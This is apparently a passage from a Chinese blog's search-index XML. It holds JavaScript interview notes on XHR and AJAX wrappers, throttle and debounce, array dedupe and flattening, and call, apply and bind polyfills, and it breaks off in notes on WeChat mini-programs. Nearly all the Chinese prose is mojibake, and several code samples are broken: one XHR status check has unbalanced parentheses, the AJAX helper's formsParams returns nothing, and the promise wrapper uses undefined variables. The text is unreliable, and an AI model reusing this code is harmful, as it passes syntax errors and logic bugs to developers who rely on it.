XMLHttpRequest();xhr.open(&apos;post&apos;,&apos;www.xxx.com&apos;,true)//true å¼€å¯å¼‚æ­¥ // æŽ¥æ”¶è¿”å›žå€¼xhr.onreadystatechange = function()&#123; if(xhr.readyState === 4 )&#123; if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304)&#123; console.log(xhr.responseText); &#125; &#125;&#125;// å¤„ç†è¯·æ±‚å‚æ•°postData = &#123;&quot;name1&quot;:&quot;value1&quot;,&quot;name2&quot;:&quot;value2&quot;&#125;;postData = (function(value)&#123; var dataString = &quot;&quot;; for(var key in value)&#123; dataString += key+&quot;=&quot;+value[key]+&quot;&amp;&quot;; &#125;; return dataString;&#125;(postData));// è®¾ç½®HTTPè¯·æ±‚å¤´ï¼Œæ­¤æ–¹æ³•å¿…é¡»åœ¨open()æ–¹æ³•å’Œsend()ä¹‹é—´è°ƒç”¨xhr.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);// å¼‚å¸¸å¤„ç†xhr.onerror = function() &#123; console.log(&apos;Network request failed&apos;)&#125;// é»˜è®¤ä¼šæºå¸¦åŒæºè¯·æ±‚çš„cookieï¼Œè€Œè·¨åŸŸè¯·æ±‚åˆ™ä¸ä¼šæºå¸¦cookieï¼Œè®¾ç½®xhrçš„withCredentialsçš„å±žæ€§ä¸ºtrueå°†å…è®¸æºå¸¦è·¨åŸŸcookieã€‚xhr.withCredentials = true;// å‘å‡ºè¯·æ±‚xhr.send(postData);//sendåŽHTTPè¯·æ±‚æ‰ä¼šè¢«çœŸæ­£å‘å‡º AJAXå°è£… 1function Ajax(options) &#123; var xhr = null; var params = formsParams(options.data); // ç¬¬ä¸€æ­¥ï¼š åˆ›å»ºè¯·æ±‚å¯¹è±¡ if(window.XMLHttpRequest) &#123; xhr = new XMLHttpRequest(); &#125; else &#123; // å…¼å®¹IE6 xhr = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); &#125; // ç¬¬äºŒæ­¥ï¼š è¿žæŽ¥ï¼Œæ‰§è¡Œopenå’Œsendæ–¹æ³•ï¼› if(options.type == &apos;GET&apos;) &#123; xhr.open(options.type, options.url + &apos;?&apos; + params, options.async); xhr.send(); &#125; else if(options.type == &apos;POST&apos;) &#123; xhr.open(options.type, options.url, options.async); xhr.setRequestHeader(&apos;Content-Type&apos;, &apos;application/x-www-form-urlencoded&apos;); xhr.send(params); &#125; // ç»‘å®šonreadystatechangeäº‹ä»¶ xhr.onreadystatechange = function() &#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123; options.success(xhr.responseText); &#125; &#125; function formsParams(data) &#123; var arr = []; for(var i in data) &#123; arr.push(i + &apos;=&apos; + data[i]); &#125; arr.join(&apos;&amp;&apos;); &#125;&#125; ä½¿ç”¨æ–¹æ³•ï¼š 1Ajax(&#123; type: &apos;GET&apos;, url: &apos;a.php&apos;, async: true, data: &#123; name: &apos;zhangsan&apos;, age: 10 &#125;, success: function(data) &#123; console.log(data); &#125;&#125;); AJAXçš„ä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼š å®žçŽ°å±€éƒ¨åˆ·æ–° å‡è½»æœåŠ¡å™¨ç«¯åŽ‹åŠ› ç¼ºç‚¹ï¼š ç ´åæµè§ˆå™¨å‰è¿›å’ŒåŽé€€æœºåˆ¶ï¼› ä¸€ä¸ªé¡µé¢ajaxè¯·æ±‚è¿‡å¤šï¼Œä¼šé€ æˆé¡µé¢åŠ è½½ç¼“æ…¢ï¼› æ•°æ®å®‰å…¨é—®é¢˜ä¸å¤ªå¥½ï¼Œå¯ä»¥é‡‡ç”¨æ•°æ®åŠ å¯†çš„æ–¹å¼ï¼› readyStateçŠ¶æ€ç ï¼š 0 - openæ–¹æ³•è¿˜æ²¡è°ƒç”¨ 1 - å·²ç»è°ƒç”¨sendæ–¹æ³•ï¼Œæ­£åœ¨å‘é€è¯·æ±‚ 2 - sendæ–¹æ³•å·²ç»å®Œæˆï¼Œå·²ç»æŽ¥æ”¶åˆ°å…¨éƒ¨ç›¸åº”å†…å®¹ 3- æ­£åœ¨è§£æžç›¸åº”å†…å®¹ 4 - ç›¸åº”å†…å®¹è§£æžå®Œæˆ stausçŠ¶æ€ç ï¼š 200 - æˆåŠŸ 404 - æœªæ‰¾åˆ° 5** - æœåŠ¡å™¨é”™è¯¯ å°†åŽŸç”Ÿçš„ajaxå°è£…æˆpromise 123456789101112131415var myNewAjax=function(url)&#123; return new Promise(function(resolve,reject)&#123; var xhr = new XMLHttpRequest(); xhr.open(&apos;get&apos;,url); xhr.send(data); xhr.onreadystatechange=function()&#123; if(xhr.status==200&amp;&amp;readyState==4)&#123; var json=JSON.parse(xhr.responseText); resolve(json) &#125;else if(xhr.readyState==4&amp;&amp;xhr.status!=200)&#123; reject(&apos;error&apos;); &#125; &#125; &#125;)&#125; æ–¹æ³•èŠ‚æµ/é˜²æŠ–1function throttle(fn,delay)&#123; let lastTime = 0; //é€šè¿‡é—­åŒ…ä¿å­˜lastTime return ()=&gt;&#123; let nowTime = Date.now(); if(nowTime - lastTime&gt;delay)&#123; //ä¿®æ­£thisæŒ‡å‘é—®é¢˜ fn.call(this) lastTime = nowTime &#125; &#125;&#125;function debounce(fn,delay)&#123; let timer = null return ()=&gt;&#123; clearTimeout(timer) timer = setTimeout(()=&gt;&#123; fn.apply(this) &#125;,delay) &#125; &#125; æ•°ç»„åŽ»é‡123456789101112//å…ˆæŽ’åºå†å¯¹æ¯”ç›¸é‚»æ˜¯å¦ç›¸åŒï¼Œåªåšäº†ä¸€æ¬¡æŽ’åºå’Œä¸€æ¬¡å¾ªçŽ¯ï¼Œæ‰€ä»¥æ•ˆçŽ‡æ¯”è¾ƒé«˜function distinct(arr) &#123; arr = arr.sort() let result = [arr[0]] for (let i=1, len=arr.length; i&lt;len; i++) &#123; arr[i] !== arr[i-1] &amp;&amp; result.push(arr[i]) &#125; return result&#125;arr.filter((item,index,self)=&gt;&#123; return index===self.indexOf(item)&#125;) 1ä½¿ç”¨ ES6 ä¸­çš„ Array.filter() éåŽ†æ•°ç»„ï¼Œå¹¶ç»“åˆ indexOf æ¥æŽ’é™¤é‡å¤é¡¹function distinct(arr) &#123; return arr.filter((item, index)=&gt; &#123; return arr.indexOf(item) === index &#125;)&#125;indexOf() æ–¹æ³•å¯è¿”å›žæŸä¸ªæŒ‡å®šçš„å­—ç¬¦ä¸²å€¼åœ¨å­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºçŽ°çš„ä½ç½® 1function distinct(arr) &#123; return [...new Set(arr)]&#125; åµŒå¥—çš„æ•°ç»„æ‰å¹³åŒ–ä¾‹å¦‚: 1flattenDeep([1, [2, [3, [4]], 5]]); //[1, 2, 3, 4, 5] åˆ©ç”¨ Array.prototype.flat ES6 ä¸ºæ•°ç»„å®žä¾‹æ–°å¢žäº† flat æ–¹æ³•ï¼Œç”¨äºŽå°†åµŒå¥—çš„æ•°ç»„â€œæ‹‰å¹³â€ï¼Œå˜æˆä¸€ç»´çš„æ•°ç»„ã€‚è¯¥æ–¹æ³•è¿”å›žä¸€ä¸ªæ–°æ•°ç»„ï¼Œå¯¹åŽŸæ•°ç»„æ²¡æœ‰å½±å“ã€‚ flat é»˜è®¤åªä¼š â€œæ‹‰å¹³â€ ä¸€å±‚ï¼Œå¦‚æžœæƒ³è¦ â€œæ‹‰å¹³â€ å¤šå±‚çš„åµŒå¥—æ•°ç»„ï¼Œéœ€è¦ç»™ flat ä¼ é€’ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæƒ³è¦æ‹‰å¹³çš„å±‚æ•°ã€‚ 1function flattenDeep(arr, deepLength) &#123; return arr.flat(deepLength);&#125;console.log(flattenDeep([1, [2, [3, [4]], 5]], 3)); å½“ä¼ é€’çš„æ•´æ•°å¤§äºŽæ•°ç»„åµŒå¥—çš„å±‚æ•°æ—¶ï¼Œä¼šå°†æ•°ç»„æ‹‰å¹³ä¸ºä¸€ç»´æ•°ç»„ï¼ŒJSèƒ½è¡¨ç¤ºçš„æœ€å¤§æ•°å­—ä¸º Math.pow(2, 53) - 1ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿™æ ·å®šä¹‰ flattenDeep å‡½æ•° 1function flattenDeep(arr) &#123; //å½“ç„¶ï¼Œå¤§å¤šæ—¶å€™æˆ‘ä»¬å¹¶ä¸ä¼šæœ‰è¿™ä¹ˆå¤šå±‚çº§çš„åµŒå¥— return arr.flat(Math.pow(2,53) - 1); &#125;console.log(flattenDeep([1, [2, [3, [4]], 5]])); åˆ©ç”¨ reduce å’Œ concat 1function flattenDeep(arr)&#123; return arr.reduce((acc, val) =&gt; Array.isArray(val) ? acc.concat(flattenDeep(val)) : acc.concat(val), []);&#125;console.log(flattenDeep([1, [2, [3, [4]], 5]])); ä½¿ç”¨ stack æ— é™ååµŒå¥—å¤šå±‚åµŒå¥—æ•°ç»„ 1function flattenDeep(input) &#123; const stack = [...input]; const res = []; while (stack.length) &#123; // ä½¿ç”¨ pop ä»Ž stack ä¸­å–å‡ºå¹¶ç§»é™¤å€¼ const next = stack.pop(); if (Array.isArray(next)) &#123; // ä½¿ç”¨ push é€å›žå†…å±‚æ•°ç»„ä¸­çš„å…ƒç´ ï¼Œä¸ä¼šæ”¹åŠ¨åŽŸå§‹è¾“å…¥ original input stack.push(...next); &#125; else &#123; res.push(next); &#125; &#125; // ä½¿ç”¨ reverse æ¢å¤åŽŸæ•°ç»„çš„é¡ºåº return res.reverse();&#125;console.log(flattenDeep([1, [2, [3, [4]], 5]])); call/bind/apply1// å¯¹Dateçš„æ‰©å±•ï¼Œå°† Date è½¬åŒ–ä¸ºæŒ‡å®šæ ¼å¼çš„String// æœˆ(M)ã€æ—¥(d)ã€å°æ—¶(h)ã€åˆ†(m)ã€ç§’(s)ã€å­£åº¦(q) å¯ä»¥ç”¨ 1-2 ä¸ªå ä½ç¬¦ï¼Œ // å¹´(y)å¯ä»¥ç”¨ 1-4 ä¸ªå ä½ç¬¦ï¼Œæ¯«ç§’(S)åªèƒ½ç”¨ 1 ä¸ªå ä½ç¬¦(æ˜¯ 1-3 ä½çš„æ•°å­—) // ä¾‹å­ï¼š // (new Date()).Format(&quot;yyyy-MM-dd hh:mm:ss.S&quot;) ==&gt; 2006-07-02 08:09:04.423 // (new Date()).Format(&quot;yyyy-M-d h:m:s.S&quot;) ==&gt; 2006-7-2 8:9:4.18 Date.prototype.Format = function (fmt) &#123; //author: meizz var o = &#123; &quot;M+&quot;: this.getMonth() + 1, //æœˆä»½ &quot;d+&quot;: this.getDate(), //æ—¥ &quot;h+&quot;: this.getHours(), //å°æ—¶ &quot;m+&quot;: this.getMinutes(), //åˆ† &quot;s+&quot;: this.getSeconds(), //ç§’ &quot;q+&quot;: Math.floor((this.getMonth() + 3) / 3), //å­£åº¦ &quot;S&quot;: this.getMilliseconds() //æ¯«ç§’ &#125;; if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + &quot;&quot;).substr(4 - RegExp.$1.length)); for (var k in o) if (new RegExp(&quot;(&quot; + k + &quot;)&quot;).test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : ((&quot;00&quot; + o[k]).substr((&quot;&quot; + o[k]).length))); return fmt;&#125; call/bind/applycall å’Œ apply çš„åŠŸèƒ½ç›¸åŒï¼Œéƒ½æ˜¯æ”¹å˜ this çš„æ‰§è¡Œï¼Œå¹¶ç«‹å³æ‰§è¡Œå‡½æ•°ã€‚åŒºåˆ«åœ¨äºŽä¼ å‚æ–¹å¼ä¸åŒã€‚ func.call(thisArg, arg1, arg2, ...)ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ this æŒ‡å‘çš„å¯¹è±¡ï¼Œå…¶å®ƒå‚æ•°ä¾æ¬¡ä¼ å…¥ã€‚ func.apply(thisArg, [argsArray])ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ this æŒ‡å‘çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°ç»„æˆ–ç±»æ•°ç»„ã€‚ call åœ¨ call æ–¹æ³•ä¸­èŽ·å–è°ƒç”¨call()å‡½æ•° å¦‚æžœç¬¬ä¸€ä¸ªå‚æ•°æ²¡æœ‰ä¼ å…¥ï¼Œé‚£ä¹ˆé»˜è®¤æŒ‡å‘ window / global(éžä¸¥æ ¼æ¨¡å¼) ä¼ å…¥ call çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ this æŒ‡å‘çš„å¯¹è±¡ï¼Œæ ¹æ®éšå¼ç»‘å®šçš„è§„åˆ™ï¼Œæˆ‘ä»¬çŸ¥é“ obj.foo(), foo() ä¸­çš„ this æŒ‡å‘ obj;å› æ­¤æˆ‘ä»¬å¯ä»¥è¿™æ ·è°ƒç”¨å‡½æ•° thisArgs.func(...args) è¿”å›žæ‰§è¡Œç»“æžœ 1Function.prototype.call = function() &#123; let [thisArg, ...args] = [...arguments]; if (!thisArg) &#123; //contextä¸ºnullæˆ–è€…æ˜¯undefined thisArg = typeof window === &apos;undefined&apos; ? global : window; &#125; //thisçš„æŒ‡å‘çš„æ˜¯å½“å‰å‡½æ•° func (func.call) thisArg.func = this; //æ‰§è¡Œå‡½æ•° let result = thisArg.func(...args); delete thisArg.func; //thisArgä¸Šå¹¶æ²¡æœ‰ func å±žæ€§ï¼Œå› æ­¤éœ€è¦ç§»é™¤ return result;&#125; apply 1Function.prototype.apply = function(thisArg, rest) &#123; let result; //å‡½æ•°è¿”å›žç»“æžœ if (!thisArg) &#123; //contextä¸ºnullæˆ–è€…æ˜¯undefined thisArg = typeof window === &apos;undefined&apos; ? global : window; &#125; //thisçš„æŒ‡å‘çš„æ˜¯å½“å‰å‡½æ•° func (func.call) thisArg.func = this; if(!rest) &#123; //ç¬¬äºŒä¸ªå‚æ•°ä¸º null / undefined result = thisArg.func(); &#125;else &#123; result = thisArg.func(...rest); &#125; delete thisArg.func; //thisArgä¸Šå¹¶æ²¡æœ‰ func å±žæ€§ï¼Œå› æ­¤éœ€è¦ç§»é™¤ return result;&#125; bind é€šè¿‡applyæˆ–è€…callæ–¹æ³•æ¥å®žçŽ°ã€‚ (1)åˆå§‹ç‰ˆæœ¬ 1Function.prototype.bind=function(obj,arg)&#123; var arg=Array.prototype.slice.call(arguments,1); var context=this; return function(newArg)&#123; arg=arg.concat(Array.prototype.slice.call(newArg)); return context.apply(obj,arg); &#125;&#125;Function.prototype.bind=function (context) &#123; if(typeof this !==&apos;function&apos;)&#123; throw new Error(`$&#123;this.name&#125; is not a function`) &#125; const srcFun=this// ä¿å­˜åŽŸå§‹å‡½æ•° const arg=Array.prototype.slice.call(arguments,1)// æŠŠargumentsç±»æ•°ç»„è½¬ä¸ºçœŸå®žæ•°ç»„ let noop=function()&#123;&#125; const fBound= function () &#123; if(this instanceof noop)&#123; context=this &#125; // åˆå¹¶æ–°æ—§å‚æ•° return srcFun.apply(context,arg.concat(Array.prototype.slice.call(arguments,0))) &#125; if(this.prototype)&#123; noop.prototype=this.prototype//ç»´æŠ¤åŽŸåž‹å…³ç³»ï¼ŒæŒ‡å‘åŽŸå§‹å‡½æ•° &#125; fBound.prototype=new noop()//æ–°å‡½æ•°çš„prototypeçš„__proto__æŒ‡å‘noop.prototype return fBound&#125; (2) å®˜æ–¹å®žçŽ° é€šè¿‡è®¾ç½®ä¸€ä¸ªä¸­è½¬æž„é€ å‡½æ•°Fï¼Œä½¿ç»‘å®šåŽçš„å‡½æ•°ä¸Žè°ƒç”¨bind()çš„å‡½æ•°å¤„äºŽåŒä¸€åŽŸåž‹é“¾ä¸Šï¼Œç”¨newæ“ä½œç¬¦è°ƒç”¨ç»‘å®šåŽçš„å‡½æ•°ï¼Œè¿”å›žçš„å¯¹è±¡ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨instanceofï¼Œå› æ­¤è¿™æ˜¯æœ€ä¸¥è°¨çš„bind()å®žçŽ°ã€‚ 1if (!Function.prototype.bind) &#123; Function.prototype.bind = function (oThis) &#123; if (typeof this !== &quot;function&quot;) &#123; // closest thing possible to the ECMAScript 5 internal IsCallable function throw new TypeError(&quot;Function.prototype.bind - what is trying to be bound is not callable&quot;); &#125; var aArgs = Array.prototype.slice.call(arguments, 1), fToBind = this, fNOP = function () &#123;&#125;, fBound = function () &#123; return fToBind.apply(this instanceof fNOP &amp;&amp; oThis ? this : oThis || window, aArgs.concat(Array.prototype.slice.call(arguments))); &#125;; fNOP.prototype = this.prototype; fBound.prototype = new fNOP(); return fBound; &#125;; &#125; å®žçŽ°ä¸€ä¸ªonceå‡½æ•°ï¼Œä¼ å…¥å‡½æ•°å‚æ•°åªæ‰§è¡Œä¸€æ¬¡ å‚è€ƒå›žç­”ï¼š 1`function ones(func)&#123;``var tag=true;``return function()&#123;``if(tag==true)&#123;``func.apply(null,arguments);``tag=false;``&#125;``return undefined``&#125;``&#125;` ç®€åŒ–èµ„æºè·¯å¾„æ ˆ 1234567891011121314var simplifyPath = function(path) &#123; var result = &apos;&apos; var tempPath = [] var paths = path.split(&apos;/&apos;) paths.map(val =&gt; &#123; if(val &amp;&amp; val === &apos;..&apos;) &#123; tempPath.pop() &#125;else if(val &amp;&amp; val !== &apos;.&apos;) &#123; tempPath.push(val) &#125; &#125;) tempPath.length ? result = &apos;/&apos;+tempPath.join(&apos;/&apos;) : result = &apos;/&apos; return result&#125;; å…¶ä»–Babelä¸ŽPolyfillBabel æ˜¯ä¸€ä¸ªå¹¿æ³›ä½¿ç”¨çš„ ES6 è½¬ç å™¨ï¼Œå¯ä»¥å°† ES6 ä»£ç è½¬ä¸º ES5 ä»£ç ã€‚æ³¨æ„ï¼šBabel é»˜è®¤åªè½¬æ¢æ–°çš„ JavaScript å¥æ³•ï¼ˆsyntaxï¼‰ï¼Œè€Œä¸è½¬æ¢æ–°çš„ APIã€‚ 12345678910111213//ä½¿ç”¨babelè½¬ç å‰çš„ä»£ç require(&apos;babel-polyfill&apos;);(x =&gt; x * 2)(1);var b = Array.of(1,2,4);//ä½¿ç”¨babelè½¬ç åŽçš„ä»£ç &apos;use strict&apos;;require(&apos;babel-polyfill&apos;);(function (x) &#123; return x * 2;&#125;)(1);var b = Array.of(1, 2, 4);//Babelè½¬æ¢äº†ES6çš„ç®­å¤´å‡½æ•°å¥æ³•ï¼Œä½†å¯¹äºŽArray.ofå¹¶æ²¡æœ‰è½¬æ¢ï¼Œå› ä¸ºArray.ofæ˜¯ES6çš„APIã€‚ Polyfillç”¨äºŽå®žçŽ°æµè§ˆå™¨å¹¶ä¸æ”¯æŒçš„åŽŸç”ŸAPIçš„ä»£ç ã€‚ ä½†ES6çš„APIå¯¹äºŽä¸æ”¯æŒES6çš„æµè§ˆå™¨ï¼Œæˆ‘ä»¬é€šè¿‡å¼•å…¥babel-polyfillä½¿å…¶æ”¯æŒES6çš„API http://es6.ruanyifeng.com/#docs/promise https://www.nowcoder.com/questionTerminal/cea0cf46505a412d9f635a06806122f4 https://github.com/forthealllight/blog/issues/4 http://es6.ruanyifeng.com/#docs/promise https://zhuanlan.zhihu.com/p/52731370 https://zhuanlan.zhihu.com/p/57548254 https://www.jianshu.com/p/5cb692658704 https://blog.csdn.net/iot_pro/article/details/78511090 https://www.bilibili.com/video/av59639585/?p=17 https://www.jianshu.com/p/996671d4dcc4]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Fwx%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å¾®ä¿¡å°ç¨‹åºè¿è¡ŒçŽ¯å¢ƒå°ç¨‹åºçš„è¿è¡ŒçŽ¯å¢ƒåˆ†æˆæ¸²æŸ“å±‚å’Œé€»è¾‘å±‚ï¼Œå…¶ä¸­ WXML æ¨¡æ¿å’Œ WXSS æ ·å¼å·¥ä½œåœ¨æ¸²æŸ“å±‚ï¼ŒJS è„šæœ¬å·¥ä½œåœ¨é€»è¾‘å±‚ã€‚ å°ç¨‹åºçš„æ¸²æŸ“å±‚å’Œé€»è¾‘å±‚åˆ†åˆ«ç”±2ä¸ªçº¿ç¨‹ç®¡ç†ï¼šæ¸²æŸ“å±‚çš„ç•Œé¢ä½¿ç”¨äº†WebView è¿›è¡Œæ¸²æŸ“ï¼›é€»è¾‘å±‚é‡‡ç”¨JsCoreçº¿ç¨‹è¿è¡ŒJSè„šæœ¬ã€‚ä¸€ä¸ªå°ç¨‹åºå­˜åœ¨å¤šä¸ªç•Œé¢ï¼Œæ‰€ä»¥æ¸²æŸ“å±‚å­˜åœ¨å¤šä¸ªWebViewçº¿ç¨‹ï¼Œè¿™ä¸¤ä¸ªçº¿ç¨‹çš„é€šä¿¡ä¼šç»ç”±å¾®ä¿¡å®¢æˆ·ç«¯ï¼ˆä¸‹æ–‡ä¸­ä¹Ÿä¼šé‡‡ç”¨Nativeæ¥ä»£æŒ‡å¾®ä¿¡å®¢æˆ·ç«¯ï¼‰åšä¸­è½¬ï¼Œé€»è¾‘å±‚å‘é€ç½‘ç»œè¯·æ±‚ä¹Ÿç»ç”±Nativeè½¬å‘ï¼Œå°ç¨‹åºçš„é€šä¿¡æ¨¡åž‹ä¸‹å›¾æ‰€ç¤ºã€‚ é€šä¿¡æ¨¡åž‹ æ¸²æŸ“å±‚ç¨‹åºçš„é€»è¾‘å±‚å’Œæ¸²æŸ“å±‚æ˜¯åˆ†å¼€çš„ä¸¤ä¸ªçº¿ç¨‹ã€‚åœ¨æ¸²æŸ“å±‚ï¼Œå®¿ä¸»çŽ¯å¢ƒä¼šæŠŠWXMLè½¬åŒ–æˆå¯¹åº”çš„JSå¯¹è±¡ï¼Œåœ¨é€»è¾‘å±‚å‘ç”Ÿæ•°æ®å˜æ›´çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡å®¿ä¸»çŽ¯å¢ƒæä¾›çš„setDataæ–¹æ³•æŠŠæ•°æ®ä»Žé€»è¾‘å±‚ä¼ é€’åˆ°æ¸²æŸ“å±‚ï¼Œå†ç»è¿‡å¯¹æ¯”å‰åŽå·®å¼‚ï¼ŒæŠŠå·®å¼‚åº”ç”¨åœ¨åŽŸæ¥çš„Domæ ‘ä¸Šï¼Œæ¸²æŸ“å‡ºæ­£ç¡®çš„UIç•Œé¢ã€‚ äº‹ä»¶ç»‘å®šäº‹ä»¶ç»‘å®šçš„å†™æ³•å’Œç»„ä»¶å±žæ€§ä¸€è‡´ï¼Œä»¥key=â€valueâ€çš„å½¢å¼ï¼Œå…¶ä¸­ï¼š keyä»¥bindæˆ–è€…catchå¼€å¤´ï¼Œç„¶åŽè·Ÿä¸Šäº‹ä»¶çš„ç±»åž‹ï¼Œå¦‚bindtapã€catchtouchstartã€‚è‡ªåŸºç¡€åº“ç‰ˆæœ¬1.5.0èµ·ï¼Œbindå’ŒcatchåŽå¯ä»¥ç´§è·Ÿä¸€ä¸ªå†’å·ï¼Œå…¶å«ä¹‰ä¸å˜ï¼Œå¦‚bind:tapã€catch:touchstartã€‚åŒæ—¶bindå’Œcatchå‰è¿˜å¯ä»¥åŠ ä¸Šcapture-æ¥è¡¨ç¤ºæ•èŽ·é˜¶æ®µã€‚ valueæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œéœ€è¦åœ¨å¯¹åº”çš„é¡µé¢Pageæž„é€ å™¨ä¸­å®šä¹‰åŒåçš„å‡½æ•°ï¼Œå¦åˆ™è§¦å‘äº‹ä»¶æ—¶åœ¨æŽ§åˆ¶å°ä¼šæœ‰æŠ¥é”™ä¿¡æ¯ã€‚bindå’Œcapture-bindçš„å«ä¹‰åˆ†åˆ«ä»£è¡¨äº‹ä»¶çš„å†’æ³¡é˜¶æ®µå’Œæ•èŽ·é˜¶æ®µï¼Œå…¶è§¦å‘çš„é¡ºåºå¦‚å›¾3-8æ‰€ç¤ºã€‚ ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œç‚¹å‡» inner view ä¼šå…ˆåŽè°ƒç”¨handleTap2ã€handleTap4ã€handleTap3ã€handleTap1ã€‚ ä»£ç æ¸…å•3-20 äº‹ä»¶çš„å†’æ³¡å’Œæ•èŽ· 1234567891011121314&lt;view id="outer" bind:touchstart="handleTap1" capture-bind:touchstart="handleTap2"&gt; outer view &lt;view id="inner" bind:touchstart="handleTap3" capture-bind:touchstart="handleTap4" &gt; inner view &lt;/view&gt;&lt;/view&gt; bindäº‹ä»¶ç»‘å®šä¸ä¼šé˜»æ­¢å†’æ³¡äº‹ä»¶å‘ä¸Šå†’æ³¡ï¼Œcatchäº‹ä»¶ç»‘å®šå¯ä»¥é˜»æ­¢å†’æ³¡äº‹ä»¶å‘ä¸Šå†’æ³¡ã€‚å¦‚æžœå°†ä¸Šé¢ä»£ç ä¸­çš„ç¬¬ä¸€ä¸ªcapture-bindæ”¹ä¸ºcapture-catchï¼Œå°†åªè§¦å‘handleTap2(capture-catchå°†ä¸­æ–­æ•èŽ·é˜¶æ®µå’Œå–æ¶ˆå†’æ³¡é˜¶æ®µ) ä»£ç æ¸…å•3-21 ä½¿ç”¨catché˜»æ­¢äº‹ä»¶çš„ä¼ é€’ 1234567891011121314&lt;view id="outer" bind:touchstart="handleTap1" capture-catch:touchstart="handleTap2"&gt; outer view &lt;view id="inner" bind:touchstart="handleTap3" capture-bind:touchstart="handleTap4" &gt; inner view &lt;/view&gt;&lt;/view&gt; æ³¨æ„ï¼Œé™¤è¡¨3-10åˆ—ä¸¾çš„äº‹ä»¶ç±»åž‹ä¹‹å¤–çš„å…¶ä»–ç»„ä»¶è‡ªå®šä¹‰äº‹ä»¶ï¼Œå¦‚æ— ç‰¹æ®Šå£°æ˜Žéƒ½æ˜¯éžå†’æ³¡äº‹ä»¶ï¼Œå¦‚çš„submitäº‹ä»¶ï¼Œçš„inputäº‹ä»¶ï¼Œçš„scrolläº‹ä»¶ã€‚ é€»è¾‘å±‚ å°ç¨‹åºä¸­çš„ JavaScript æ˜¯ç”±ECMAScript ä»¥åŠå°ç¨‹åºæ¡†æž¶å’Œå°ç¨‹åº API æ¥å®žçŽ°çš„ã€‚åŒæµè§ˆå™¨ä¸­çš„JavaScript ç›¸æ¯”æ²¡æœ‰ BOM ä»¥åŠ DOM å¯¹è±¡ï¼Œæ‰€ä»¥ç±»ä¼¼ JQueryã€Zeptoè¿™ç§æµè§ˆå™¨ç±»åº“æ˜¯æ— æ³•åœ¨å°ç¨‹åºä¸­è¿è¡Œèµ·æ¥çš„ï¼ŒåŒæ ·çš„ç¼ºå°‘ Native æ¨¡å—å’ŒNPMåŒ…ç®¡ç†çš„æœºåˆ¶ï¼Œå°ç¨‹åºä¸­æ— æ³•åŠ è½½åŽŸç”Ÿåº“ï¼Œä¹Ÿæ— æ³•ç›´æŽ¥ä½¿ç”¨å¤§éƒ¨åˆ†çš„ NPM åŒ…ã€‚ å°ç¨‹åºä¸­çš„è„šæœ¬æ‰§è¡Œé¡ºåºæœ‰æ‰€ä¸åŒã€‚å°ç¨‹åºçš„æ‰§è¡Œçš„å…¥å£æ–‡ä»¶æ˜¯ app.js ã€‚å¹¶ä¸”ä¼šæ ¹æ®å…¶ä¸­ require çš„æ¨¡å—é¡ºåºå†³å®šæ–‡ä»¶çš„è¿è¡Œé¡ºåºã€‚ æ‰€æœ‰é¡µé¢çš„è„šæœ¬é€»è¾‘éƒ½è·‘åœ¨åŒä¸€ä¸ªJsCoreçº¿ç¨‹ï¼Œé¡µé¢ä½¿ç”¨setTimeoutæˆ–è€…setIntervalçš„å®šæ—¶å™¨ï¼Œç„¶åŽè·³è½¬åˆ°å…¶ä»–é¡µé¢æ—¶ï¼Œè¿™äº›å®šæ—¶å™¨å¹¶æ²¡æœ‰è¢«æ¸…é™¤ï¼Œéœ€è¦å¼€å‘è€…è‡ªå·±åœ¨é¡µé¢ç¦»å¼€çš„æ—¶å€™è¿›è¡Œæ¸…ç†ã€‚ ç¨‹åºä¸Žé¡µé¢å®¿ä¸»çŽ¯å¢ƒæä¾›äº† App() æž„é€ å™¨ç”¨æ¥æ³¨å†Œä¸€ä¸ªç¨‹åºAppï¼Œéœ€è¦ç•™æ„çš„æ˜¯App() æž„é€ å™¨å¿…é¡»å†™åœ¨é¡¹ç›®æ ¹ç›®å½•çš„app.jsé‡Œï¼ŒAppå®žä¾‹æ˜¯å•ä¾‹å¯¹è±¡ï¼Œåœ¨å…¶ä»–JSè„šæœ¬ä¸­å¯ä»¥ä½¿ç”¨å®¿ä¸»çŽ¯å¢ƒæä¾›çš„ getApp() æ¥èŽ·å–ç¨‹åºå®žä¾‹ã€‚ 1234567App(&#123; onLaunch: function(options) &#123;f&#125;, onShow: function(options) &#123;f&#125;, onHide: function() &#123;f&#125;, onError: function(msg) &#123;f&#125;, globalData: 'I am global data'&#125;) å®¿ä¸»çŽ¯å¢ƒæä¾›äº† Page() æž„é€ å™¨ç”¨æ¥æ³¨å†Œä¸€ä¸ªå°ç¨‹åºé¡µé¢ï¼ŒPage()åœ¨é¡µé¢è„šæœ¬page.jsä¸­è°ƒç”¨ï¼ŒPage() çš„è°ƒç”¨æ–¹å¼å¦‚ä»£ç æ¸…å•3-8æ‰€ç¤ºã€‚Pageæž„é€ 